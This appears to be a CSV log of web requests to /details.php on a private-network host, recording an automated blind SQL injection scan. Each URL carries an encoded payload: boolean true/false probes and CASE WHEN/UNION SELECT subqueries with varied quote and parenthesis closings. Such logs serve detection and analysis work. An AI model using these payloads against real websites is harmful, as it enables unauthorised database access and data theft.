full_url,event_time,hostname
/details.php?prod=5&type=2%25%27%20AND%201185%3D4224%20AND%20%27RYak%25%27%3D%27RYak,1680093125.424121,10.0.2.31
/details.php?prod=5&type=2%25%27%20AND%203472%3D3472%20AND%20%27GdvS%25%27%3D%27GdvS,1680093125.42788,10.0.2.31
/details.php?prod=5&type=2%27%20AND%203160%3D7429%20AND%20%27TPLI%27%20LIKE%20%27TPLI,1680093125.431019,10.0.2.31
/details.php?prod=5&type=2%27%20AND%203472%3D3472%20AND%20%27NTNF%27%20LIKE%20%27NTNF,1680093125.436385,10.0.2.31
/details.php?prod=5&type=2%22%29%20AND%206374%3D1822%20AND%20%28%22KSaV%22%3D%22KSaV,1680093125.439988,10.0.2.31
/details.php?prod=5&type=2%22%29%20AND%203472%3D3472%20AND%20%28%22qNRL%22%3D%22qNRL,1680093125.443307,10.0.2.31
/details.php?prod=5&type=2%22%20AND%206571%3D7821%20AND%20%22IFnO%22%3D%22IFnO,1680093125.447222,10.0.2.31
/details.php?prod=5&type=2%22%20AND%203472%3D3472%20AND%20%22uNKY%22%3D%22uNKY,1680093125.451353,10.0.2.31
/details.php?prod=5&type=2%29%20AND%208160%3D%28SELECT%20%28CASE%20WHEN%20%288160%3D5373%29%20THEN%208160%20ELSE%20%28SELECT%205373%20UNION%20SELECT%207398%29%20END%29%29--%20-,1680093125.455223,10.0.2.31
/details.php?prod=5&type=2%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,1680093125.458632,10.0.2.31
/details.php?prod=5&type=2%29%29%20AND%201567%3D%28SELECT%20%28CASE%20WHEN%20%281567%3D3560%29%20THEN%201567%20ELSE%20%28SELECT%203560%20UNION%20SELECT%201549%29%20END%29%29--%20-,1680093125.466043,10.0.2.31
/details.php?prod=5&type=2%29%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,1680093125.474709,10.0.2.31
/details.php?prod=5&type=2%20AND%208271%3D%28SELECT%20%28CASE%20WHEN%20%288271%3D4783%29%20THEN%208271%20ELSE%20%28SELECT%204783%20UNION%20SELECT%208954%29%20END%29%29--%20-,1680093125.48276,10.0.2.31
/details.php?prod=5&type=2%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,1680093125.49092,10.0.2.31
/details.php?prod=5&type=2%27%29%20AND%201281%3D%28SELECT%20%28CASE%20WHEN%20%281281%3D8198%29%20THEN%201281%20ELSE%20%28SELECT%208198%20UNION%20SELECT%202680%29%20END%29%29--%20-,1680093125.495722,10.0.2.31
